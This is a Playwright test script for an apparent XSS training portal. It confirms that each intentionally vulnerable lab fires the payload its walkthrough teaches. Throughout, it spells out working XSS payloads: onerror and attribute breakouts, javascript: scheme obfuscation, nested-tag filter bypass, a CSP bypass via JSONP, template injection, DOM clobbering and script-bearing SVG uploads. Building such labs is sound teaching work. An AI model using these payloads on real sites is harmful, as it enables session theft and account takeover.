/**
 * Verifies that every lab actually executes the payload its walkthrough teaches.
 *
 * Each lab is loaded inside the same sandboxed iframe the portal uses, the
 * documented payload is delivered through the lab's own form/URL, and the test
 * asserts real evidence: a script-execution message from the lab frame, a native
 * dialog (for the SVG case, which has no shim), or the expected DOM state.
 */
import { chromium } from 'playwright';

const BASE = process.env.BASE || 'http://127.0.0.1:3000';
const enc = encodeURIComponent;

const HARNESS = `<!doctype html><html><body style="margin:0">
<script>
window.__msgs = [];
addEventListener('message', function (e) { window.__msgs.push({ d: e.data, origin: e.origin }); });
</script>
<iframe id="f" sandbox="allow-scripts allow-forms allow-modals" style="width:920px;height:720px;border:0" src="about:blank"></iframe>
</body></html>`;

const IMG = '<img src=x onerror=alert(document.domain)>';

/* ------------------------------------------------------------------ */

const cases = [
  // --- reflected ---
  { id: 'reflected-html', path: `/lab/reflected-html?q=${enc(IMG)}` },
  {
    id: 'reflected-attribute',
    path: `/lab/reflected-attribute?q=${enc('" autofocus onfocus="alert(document.domain)')}`,
    setup: async (frame) => {
      await frame.hover('input.q').catch(() => {});
      await frame.click('input.q').catch(() => {});
    },
  },
  {
    id: 'reflected-unquoted',
    path: `/lab/reflected-unquoted?q=${enc('x onmouseover=alert(document.domain)')}`,
    setup: async (frame) => {
      await frame.hover('.preview');
    },
  },
  { id: 'reflected-js-string', path: `/lab/reflected-js-string?q=${enc("';alert(document.domain);//")}` },
  {
    id: 'reflected-href',
    path: `/lab/reflected-href?q=${enc('" onclick="alert(document.domain)')}`,
    setup: async (frame) => {
      await frame.click('#refine');
      await frame.waitForTimeout(300);
    },
  },
  {
    id: 'reflected-href-scheme',
    path: `/lab/reflected-href?q=${enc('java&#9;script:alert(document.domain)')}`,
  },
  { id: 'reflected-json', path: `/lab/reflected-json?q=${enc(IMG)}` },

  // --- stored ---
  {
    id: 'stored-guestbook',
    path: '/lab/stored-guestbook',
    setup: async (frame) => {
      await frame.fill('input[name=name]', 'tester');
      await frame.fill('textarea[name=message]', '<script>alert(document.domain)</script>');
      await frame.click('button[type=submit]');
    },
  },
  {
    id: 'stored-profile',
    path: '/lab/stored-profile',
    setup: async (frame) => {
      await frame.fill('textarea[name=bio]', '<img src=x onerror=alert("admin-view")>');
      await frame.click('button[type=submit]');
      await frame.waitForTimeout(500);
      await frame.goto(`${BASE}/lab/stored-profile/admin`);
    },
  },
  {
    id: 'stored-second-order',
    path: '/lab/stored-second-order',
    setup: async (frame) => {
      await frame.fill('input[name=name]', '<img src=x onerror=alert("invoice")>');
      await frame.click('button[type=submit]');
      await frame.waitForTimeout(500);
      await frame.goto(`${BASE}/lab/stored-second-order/print`);
    },
  },
  {
    id: 'stored-filename',
    path: '/lab/stored-filename',
    setup: async (frame) => {
      await frame.fill('input[name=filename]', '"><img src=x onerror=alert("filename")>.pdf');
      await frame.click('button[type=submit]');
    },
  },
  {
    id: 'stored-log',
    path: '/lab/stored-log',
    setup: async (frame) => {
      await frame.fill('input[name=subject]', 'help');
      await frame.fill('textarea[name=message]', '<img src=x onerror=alert("log")>');
      await frame.click('button[type=submit]');
      await frame.waitForTimeout(500);
      await frame.goto(`${BASE}/lab/stored-log/admin`);
    },
  },

  // --- dom ---
  { id: 'dom-document-write', path: `/lab/dom-document-write#${enc(IMG)}` },
  { id: 'dom-innerhtml', path: `/lab/dom-innerhtml?name=${enc(IMG)}` },
  { id: 'dom-eval', path: `/lab/dom-eval#${enc('alert(document.domain)')}` },
  { id: 'dom-settimeout', path: `/lab/dom-settimeout#${enc('alert(document.domain)')}` },
  { id: 'dom-selector', path: `/lab/dom-selector#${enc(IMG)}` },
  {
    id: 'dom-postmessage',
    path: '/lab/dom-postmessage',
    setup: async (frame, page) => {
      const widget = page.frames().find((f) => f.url().includes('/widget'));
      if (!widget) throw new Error('widget frame missing');
      await widget.fill('#m', IMG);
      await widget.click('button[type=submit]');
    },
  },
  {
    id: 'dom-windowname',
    path: '/lab/dom-windowname',
    setup: async (frame) => {
      await frame.fill('#v', IMG);
      await frame.click('button[type=submit]');
    },
  },
  {
    id: 'dom-json',
    path: '/lab/dom-json',
    setup: async (frame) => {
      await frame.fill('input[name=text]', '<img src=x onerror=alert("notification")>');
      await frame.click('button[type=submit]');
    },
  },
  { id: 'dom-urlpath', path: `/lab/dom-urlpath/${enc(IMG)}` },
  {
    id: 'dom-clobbering',
    path: '/lab/dom-clobbering',
    setup: async (frame) => {
      await fetch(`${BASE}/api/reset?lab=dom-clobbering`, { method: 'POST' });
      await frame.fill(
        'input[name=name]',
        '<a id="appConfig"></a><a id="appConfig" name="endpoint" href="/api/attack/log?lab=dom-clobbering&src=clobbered"></a>'
      );
      await frame.click('button[type=submit]');
      await frame.waitForTimeout(500);
      await frame.goto(`${BASE}/lab/dom-clobbering`);
      await frame.waitForTimeout(500);
    },
    check: async (frame, page) => {
      await frame.click('#beat-btn').catch(() => {});
      for (let i = 0; i < 20; i++) {
        const r = await (await fetch(`${BASE}/api/attack?lab=dom-clobbering`)).json();
        if (r.entries && r.entries.length) {
          return { ok: true, detail: `heartbeat hijacked: ${r.entries[0].src} ${String(r.entries[0].data).slice(0, 30)}` };
        }
        await page.waitForTimeout(200);
      }
      return { ok: false, detail: 'no callback recorded at /api/attack/log' };
    },
  },

  // --- bypass ---
  { id: 'bypass-tag-blacklist', path: `/lab/bypass-tag-blacklist?q=${enc(IMG)}` },
  {
    id: 'bypass-nested-tag',
    path: `/lab/bypass-nested-tag?q=${enc('<scr<script>ipt>alert(document.domain)</scr</script>ipt>')}`,
  },
  {
    id: 'bypass-csp-jsonp',
    path: `/lab/bypass-csp-jsonp?q=${enc('<script src="/api/jsonp?cb=alert"></script>')}`,
  },
  { id: 'bypass-csti', path: `/lab/bypass-csti?t=${enc('{{alert(document.domain)}}')}` },

  // --- blind ---
  {
    id: 'blind-contact',
    path: '/lab/blind-contact',
    setup: async (frame) => {
      await frame.fill('input[name=name]', 'tester');
      await frame.fill('input[name=email]', 't@example.com');
      await frame.fill('textarea[name=message]', '<img src=x onerror=alert("staff-queue")>');
      await frame.click('button[type=submit]');
      await frame.waitForTimeout(500);
      await frame.goto(`${BASE}/lab/blind-contact/admin`);
    },
  },
  {
    id: 'blind-header',
    path: '/lab/blind-header',
    setup: async (frame) => {
      await frame.fill('input[name=ua]', 'Mozilla/5.0 <img src=x onerror=alert("dashboard")>');
      await frame.click('button[type=submit]');
      await frame.waitForTimeout(500);
      await frame.goto(`${BASE}/lab/blind-header/admin`);
    },
  },
  {
    id: 'blind-exfil',
    path: '/lab/blind-exfil',
    setup: async (frame) => {
      await frame.fill('textarea[name=note]', '<img src=x onerror=alert("agent-console")>');
      await frame.click('button[type=submit]');
      await frame.waitForTimeout(500);
      await frame.goto(`${BASE}/lab/blind-exfil/admin`);
    },
  },

  // --- self ---
  {
    id: 'self-console',
    path: '/lab/self-console',
    setup: async (frame) => {
      await frame.fill('#code', 'alert(document.domain)');
      await frame.click('#run');
    },
  },

  // --- scenarios ---
  {
    id: 'rw-blog-moderator',
    path: '/lab/rw-blog-moderator',
    setup: async (frame) => {
      await frame.fill('input[name=author]', 'reader');
      await frame.fill('textarea[name=body]', '<img src=x onerror=alert("queue")>');
      await frame.click('button[type=submit]');
      await frame.waitForTimeout(500);
      await frame.goto(`${BASE}/lab/rw-blog-moderator/admin`);
    },
  },
  {
    id: 'rw-support-ticket',
    path: '/lab/rw-support-ticket',
    setup: async (frame) => {
      await frame.fill('input[name=subject]', 'help');
      await frame.fill('textarea[name=body]', '<img src=x onerror=alert("ticket")>');
      await frame.click('button[type=submit]');
      await frame.waitForTimeout(500);
      await frame.goto(`${BASE}/lab/rw-support-ticket/admin`);
    },
  },
  { id: 'rw-password-reset', path: `/lab/rw-password-reset?email=${enc("';alert(document.domain)//")}` },
  { id: 'rw-oauth-state', path: `/lab/rw-oauth-state?state=${enc(IMG)}` },
  {
    id: 'rw-chat-widget',
    path: '/lab/rw-chat-widget',
    setup: async (frame) => {
      await frame.fill('#msg', JSON.stringify({ type: 'config', brand: IMG }));
      await frame.click('#send');
      await frame.waitForTimeout(500);
    },
    check: async (frame, page) => {
      const widget = page.frames().find((f) => f.url().includes('/widget'));
      if (!widget) return { ok: false, detail: 'widget frame missing' };
      const n = await widget.locator('#brand img').count();
      return { ok: n > 0, detail: `widget render #brand img count=${n}` };
    },
  },
  {
    id: 'rw-markdown',
    path: '/lab/rw-markdown',
    setup: async (frame) => {
      await frame.fill('input[name=author]', 'reader');
      await frame.fill('textarea[name=body]', '<img src=x onerror=alert("markdown")>');
      await frame.click('button[type=submit]');
    },
  },
  {
    id: 'rw-svg-upload',
    path: '/lab/rw-svg-upload',
    setup: async (frame) => {
      await frame.fill('input[name=name]', 'avatar.svg');
      await frame.fill(
        'textarea[name=svg]',
        '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="80"><text y="20">hi</text><script>alert("svg")</script></svg>'
      );
      await frame.click('button[type=submit]');
      await frame.waitForTimeout(500);
      await frame.goto(`${BASE}/lab/rw-svg-upload/file?name=avatar.svg`);
    },
    expect: 'dialog',
  },
];

/* ------------------------------------------------------------------ */

async function labFrame(page) {
  for (let i = 0; i < 120; i++) {
    const f = page.frames().find((fr) => fr.parentFrame() === page.mainFrame() && /\/lab\//.test(fr.url()));
    if (f) return f;
    await page.waitForTimeout(100);
  }
  throw new Error('lab frame never loaded');
}

async function waitForEvidence(page, expect) {
  for (let i = 0; i < 30; i++) {
    const msgs = await page.evaluate(() => window.__msgs || []).catch(() => []);
    const hit = msgs.find((m) => m.d && (m.d.kind === 'alert' || m.d.kind === 'solved'));
    if (expect !== 'dialog' && hit) return { ok: true, detail: `${hit.d.kind}: ${String(hit.d.message || '').slice(0, 60)}` };
    await page.waitForTimeout(120);
  }
  return { ok: false, detail: 'no execution evidence' };
}

const browser = await chromium.launch();
let pass = 0;
const failures = [];

for (const c of cases) {
  const page = await browser.newPage();
  const dialogs = [];
  const errors = [];
  page.on('dialog', async (d) => {
    dialogs.push(d.message());
    await d.dismiss().catch(() => {});
  });
  page.on('pageerror', (e) => errors.push(e.message));

  let result = { ok: false, detail: '' };
  try {
    await page.setContent(HARNESS);
    await page.evaluate((p) => {
      document.getElementById('f').src = p;
    }, BASE + c.path);
    const frame = await labFrame(page);
    await frame.waitForLoadState('domcontentloaded').catch(() => {});
    await page.waitForTimeout(250);

    if (c.setup) {
      await c.setup(frame, page);
      await page.waitForTimeout(400);
    }

    if (c.check) {
      result = await c.check(frame, page);
    } else if (c.expect === 'dialog') {
      result = dialogs.length ? { ok: true, detail: `dialog: ${dialogs[0]}` } : { ok: false, detail: 'no native dialog' };
    } else {
      result = await waitForEvidence(page, 'alert');
    }
  } catch (e) {
    result = { ok: false, detail: `error: ${e.message.split('\n')[0]}` };
  }

  if (result.ok) {
    pass++;
    console.log(`PASS  ${c.id.padEnd(22)} ${result.detail}`);
  } else {
    failures.push({ id: c.id, detail: result.detail, errors: errors.slice(0, 2) });
    console.log(`FAIL  ${c.id.padEnd(22)} ${result.detail}`);
  }
  await page.close();
}

/* CSP negative test: inline script must be blocked on the CSP lab */
{
  const page = await browser.newPage();
  await page.setContent(HARNESS);
  await page.evaluate((p) => {
    document.getElementById('f').src = p;
  }, BASE + `/lab/bypass-csp-jsonp?q=${enc('<script>alert("inline-blocked")</script>')}`);
  const frame = await labFrame(page);
  await page.waitForTimeout(1200);
  const msgs = await page.evaluate(() => window.__msgs || []);
  const fired = msgs.some((m) => m.d && m.d.kind === 'alert');
  console.log(`${fired ? 'FAIL' : 'PASS'}  csp-inline-blocked      inline script ${fired ? 'EXECUTED (policy broken)' : 'blocked as expected'}`);
  if (fired) failures.push({ id: 'csp-inline-blocked', detail: 'inline script executed under CSP' });
  await page.close();
}

/* Attacker console round trip */
{
  const r = await fetch(`${BASE}/api/attack/log?lab=self-test&src=suite&d=${enc('hello')}`);
  const posted = await r.json();
  const list = await (await fetch(`${BASE}/api/attack?lab=self-test`)).json();
  const ok = posted.ok && list.entries && list.entries.length > 0;
  console.log(`${ok ? 'PASS' : 'FAIL'}  attacker-console        POST + list round trip`);
  if (!ok) failures.push({ id: 'attacker-console', detail: 'round trip failed' });
  await fetch(`${BASE}/api/reset?lab=self-test`, { method: 'POST' });
}

await browser.close();

console.log(`\n${pass}/${cases.length} labs executed their payload`);
if (failures.length) {
  console.log('\nFailures:');
  for (const f of failures) console.log(` - ${f.id}: ${f.detail}${f.errors && f.errors.length ? ` | ${f.errors.join(' ; ')}` : ''}`);
  process.exitCode = 1;
}
